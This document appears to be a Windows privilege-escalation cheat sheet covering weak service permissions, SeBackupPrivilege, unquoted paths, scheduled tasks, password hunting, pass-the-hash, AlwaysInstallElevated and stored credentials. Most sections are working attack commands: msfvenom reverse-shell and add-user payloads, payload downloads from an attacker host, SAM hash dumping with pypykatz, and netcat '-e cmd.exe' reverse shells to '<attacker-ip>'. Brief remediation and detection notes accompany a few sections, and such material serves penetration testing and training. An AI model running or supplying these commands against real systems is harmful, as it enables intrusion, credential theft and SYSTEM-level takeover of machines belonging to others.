#####################################
Windows Privilege Escalation Examples
#####################################

<details>
<summary>Weak Service Permissions</summary>
 <br> 
========================
In Windows, services running as LocalSystem (highest privilege) with non-default or writable executable paths and weak permissions can be exploited for privilege escalation. This document provides detection, exploitation, and remediation steps.

🔍 1. Enumerate Services Running as LocalSystem with Non-Standard Paths
These services might use custom paths (e.g., C:\Users\Public\svc.exe) instead of the protected default (C:\Windows\System32).

✅ PowerShell:

    Get-WmiObject Win32_Service | Where-Object {
    $_.StartName -eq "LocalSystem" -and
    $_.PathName -notlike "C:\Windows\System32*"
    } | Select-Object Name, StartName, PathName
✅ WMIC:
cmd

    wmic service get name,startname,pathname | findstr /i "LocalSystem" | findstr /v /i "C:\\Windows\\System32"
🔐 2. Check Permissions on Service Configuration
Use AccessChk to determine whether a user can start, stop, configure, or modify a service.

✅ Command:
cmd

    .\accesschk64.exe /accepteula -uwcqv user servicename
Look for permissions like:

Permission	Meaning
SERVICE_ALL_ACCESS	Full control
SERVICE_CHANGE_CONFIG	Can change service binary path
WRITE_DAC / WRITE_OWNER	Can escalate to full control
GENERIC_WRITE / GENERIC_ALL	Equivalent to full control

📂 3. Identify Writable Service Executables
✅ Export Executable Paths:

    for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /v /i "system32"') do @echo %a >> C:\Windows\Temp\services.txt
✅ If wmic is not available:
cmd

    sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
    FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
✅ Check Permissions:
cmd

    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do accesschk.exe /accepteula -qv "%a" >> accesschk.txt
Or use icacls/cacls:

    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do icacls "%a" >> icacls.txt
Look for:

Symbol	Meaning
(F)	Full Access
(M)	Modify Access
(W)	Write Access
(WDAC)	Write DACL
(WO)	Write Owner

⚙️ 4. Exploitation Steps
✅ 4.1 Replace the Service Executable
Generate a reverse shell payload (Metasploit):

bash

    msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o reverse_priv.exe
Host it:

bash

    python3 -m http.server 8999
Transfer to target:

powershell

    wget http://<attacker_ip>:8999/reverse_priv.exe -o reverse_priv.exe
Overwrite service binary:

powershell

    copy reverse_priv.exe "C:\Path\To\Service.exe"
✅ 4.2 Start the Service
c

    sc start <service>
Or:

cmd

    net start <service>
⚡ 5. Writable Service Object Exploitation
✅ Find Writable Service Objects
cmd

    accesschk.exe /accepteula -uwcqv "Authenticated Users" *
✅ Update Service Binary Path
cmd

    sc config <service> binPath= "C:\Path\To\reverse_priv.exe"
Remove dependencies if blocking:

cmd

    sc config <service> depend= ""
Change service start mode to manual:

cmd

    sc config <service> start= demand
Update service to run as SYSTEM:

c

    sc config <service> obj= ".\LocalSystem" password= ""
✅ Start/Stop Service:
cmd

    sc stop <service>
sc start <service>
Or:

cmd

    net stop <service>
    net start <service>
🧪 6. Validate Exploitability
powershell

    Get-WmiObject Win32_Service -Filter "Name='<service>'" |
  Select-Object Name, DisplayName, StartMode, State, StartName, PathName
🤖 7. Automated Enumeration
✅ SharpUp
Use SharpUp.exe for automated privilege escalation checks.

cmd

    SharpUp.exe --services
✅ Summary of Exploit Steps
Step	Description
🔍 1	Find services running as LocalSystem with writable paths
🔐 2	Check if current user can change or control the service
💣 3	Replace binary with malicious payload
▶️ 4	Restart or trigger the service to execute payload
⚡ 5	Get SYSTEM-level shell

🔐 Remediation Checklist
✅ Always install services in C:\Windows\System32

✅ Set tight permissions using sc sdset or GPO

✅ Regularly audit services using:

 Sysinternals AccessChk

 PowerUp / SharpUp

✅ Enable AppLocker / Software Restriction Policies

✅ Monitor service creation/modification with Sysmon

</details>

<details>
<summary>SeBackupPrivilege</summary>
 <br> 
This specific privilege escalation is based on the act of assigning a user the SeBackupPrivilege. It was designed to allow users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files.

Files like the SAM file or the SYSTEM registry file are particularly valuable to attackers. Once an attacker gains an initial foothold in the system, they can exploit this access to move up to an elevated shell. They do this by reading the SAM files and potentially cracking the passwords of high-privilege users on the system or network.

After connecting to the target machine using Evil-WinRM, we can check if the user we logged in has the SeBackupPrivilege. This can be done with the help of the whoami command with the /priv option. It can be observed from the image below that the user aarti has the SeBackupPrivilege.

    whoami /priv



## Exploiting Privilege on Windows
Now, we can start the exploitation of this privilege. As we discussed earlier that this privilege allows the user to read all the files in the system, we will use this to our advantage. To begin, we will traverse to the C:\ directory and then move to create a Temp directory. We can also traverse to a directory with read and write privileges if the attacker is trying to be sneaky. Then we change the directory to Temp. Here we use our SeBackupPrivilege to read the SAM file and save a variant of it. Similarly, we read the SYSTEM file and save a variant of it.

     cd c:\
     mkdir Temp
     reg save hklm\sam c:\Temp\sam
     reg save hklm\system c:\Temp\system

  

Transferring Files to Kali Linux
Now that the Temp directory contains the SAM and SYSTEM files, use the Evil-WinRM download command to transfer these files to your Kali Linux machine.

    cd Temp
    download sam
    download system
## Extracting Hashes with Pypykatz and Gaining Access
Now, we can extract the hive secrets from the SAM and SYSTEM files using the pypykatz. If not present on your Kali Linux, you can download it from its GitHub[https://github.com/skelsec/pypykatz]. It is a variant of Mimikatz cooked in Python. So, we can run its registry function and then use the –sam parameter to provide the path to the SAM and SYSTEM files. As soon as the command run, we can see in the demonstration below that we have successfully extracted the NTLM hashes of the Administrator account and other users as well.

    pypykatz registry --sam sam system

Now, we can use the NTLM Hash of the raj user to get access to the target machine as a raj user. We again used Evil-WinRM to do this. After connecting to the target machine, we run net user to see that raj user is a part of the Administrator group. This means we have successfully elevated privilege over our initial shell as the aarti user.

 </details>
<details>
<summary>Unquoted Service Pathss</summary>
 <br> 

----------------------

Find unquoted service paths:

.. code-block:: none

    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

If the unquoted service path is :code:`C:\Program Files\path to\service.exe`, you can place a binary in any of the following paths:

.. code-block:: none

    C:\Program.exe
    C:\Program Files.exe
    C:\Program Files\path.exe
    C:\Program Files\path to.exe
    C:\Program Files\path to\service.exe

</details>
<details>
<summary>Scheduled Task/Job</summary>
 <br> 
An attacker can exploit Windows Task Scheduler to schedule malicious programs for initial or recurrent execution. For persistence, the attacker typically uses Windows Task Scheduler to launch applications at system startup or at predefined intervals. Furthermore, the attacker executes remote code under the context of a specified account to achieve Privilege Escalation.

Task Scheduler
 You can easily schedule an automatic job using the Task Scheduler service. When you utilize this service, you set up any program to run at a specific date and time that suits your needs. Subsequently, Task Scheduler evaluates the defined time or event criteria and runs the task once those conditions are met.

Abusing Schedule Task/Job
An attacker can escalate privileges by exploiting Schedule Task/Job. Following an initial foothold, we can query to obtain the list for the scheduled task.

    schtasks /query /fo LIST /V
This helps an attack to understand which application is attached to execute Job at what time.
 
 To obtain a reverse shell as NT Authority SYSTEM, first create a malicious EXE file that a scheduled task can execute. Using Msfvenom, we then generate the EXE file and inject it into the target system accordingly.

    msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f exe > shell.exe
To abuse the scheduled Task, the attacker will either modify the application by overwriting it or may replace the original file from the duplicate. To insert a duplicate file in the same directory, we rename the original file as a file.bak.

Then downloaded malicious file.exe in the same directory with the help of wget command.
   
    powershell wget 192.168.1.3/shell.exe –o file.exe
Once the duplicate file.exe is injected in the same directory then, the file.exe will be executed automatically through Task Scheduler. As attackers make sure that netcat listener must be at listening mode for obtaining reverse connection for privilege shell.

    nc -lvp 8888
    whoami /priv

Detection
Tools such as Sysinternals[https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns] Autoruns can detect system changes like showing presently scheduled jobs.
Tools like TCPView[https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview] & Process Explore[https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer] may help to identify remote connections for suspicious services or processes.
View Task Properties and History: To view a task’s properties and history by using a command line
Schtasks /Query /FO LIST /V

Enable the “Microsoft-Windows-TaskScheduler/Operational” configuration inside the event logging service to report scheduled task creation and updates.
</details>
<details>
<summary>Cleartext Passwords</summary>
 <br> 

===================

Find passwords in arbitrary files:

.. code-block:: none

    findstr /si password *.txt *.xml *.ini

Find strings in filenames:

.. code-block:: none

    dir /s *pass* == *cred* == *vnc* == *.config*

Find passwords in all files:

.. code-block:: none

    findstr /spin "password" *.*

Common files which contain passwords:

.. code-block:: none

    type c:\sysprep.inf
    type c:\sysprep\sysprep.xml
    type c:\unattend.xml
    type %WINDIR%\Panther\Unattend\Unattended.xml
    type %WINDIR%\Panther\Unattended.xml
    dir c:*vnc.ini /s /b
    dir c:*ultravnc.ini /s /b
    dir c:\ /s /b | findstr /si *vnc.ini

Search for passwords in the registry:

.. code-block:: none

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

</details>
<details>
<summary>Passing the Hash</summary>
 <br> 
================

The following commands can be used to dump password hashes:

.. code-block:: none

    wce32.exe -w
    wce64.exe -w
    fgdump.exe

Remote
------

Pass the hash remotely to gain a shell:

.. code-block:: none

    pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd

Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):

.. code-block:: none

    pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd

Alternative:

.. code-block:: none

    export SMBHASH=<hash>
    pth-winexe -U <domain>/<username>% //<target-ip> cmd

Local
-----

Pass the hash locally using runas:

.. code-block:: none

    C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"

Pass the hash locally using PowerShell:

.. code-block:: none

    secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
    mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
    computer = "<hostname>"
    [System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

Pass the hash locally using psexec:

.. code-block:: none

    psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"

</details>
<details>
<summary>Loopback Services</summary>
 <br> 
=================

Search for services listening on the loopback interface:

.. code-block:: none

    netstat -ano | findstr "LISTEN"

Use plink.exe to forward the loopback port to a port on our attacking host (via SSH):

.. code-block:: none

    plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>

</details>
<details>
<summary>AlwaysInstallElevated</summary>
 <br> 
=====================

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

Both the following registry values must be set to "1" for this to work:

.. code-block:: none

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Create a malicious MSI:

.. code-block:: none

    msfvenom -p windows/adduser USER=pwned PASS=P@ssw0rd -f msi -o evil.msi

Use msiexec to run the malicious MSI:

.. code-block:: none

    msiexec /quiet /qn /i C:\evil.msi

</details>
<details>
<summary>Stored Credentials</summary>
 <br> 

==================

If there are stored credentials, we can run commands as that user:

.. code-block:: none

    $ cmdkey /list

    Currently stored credentials:

    Target: Domain:interactive=PWNED\Administrator
    Type: Domain Password
    User: PWNED\Administrator

Execute commands by using runas with the /savecred argument. Note that full paths are generally needed:

.. code-block:: none


    runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <attacker-port> -e cmd.exe"

   </details>
